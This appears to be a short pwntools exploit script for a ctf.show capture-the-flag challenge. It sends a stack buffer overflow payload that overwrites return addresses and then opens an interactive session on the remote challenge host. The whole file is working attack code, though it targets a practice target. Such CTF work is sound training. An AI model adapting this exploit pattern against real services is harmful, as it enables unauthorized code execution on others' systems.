from pwn import *
# p=process("./pwn")
p =remote("pwn.challenge.ctf.show", 28037)
payload = b"a" * 0x14 + p64(0x400577) + p64(0x400577)
p.send(payload)
p.interactive()
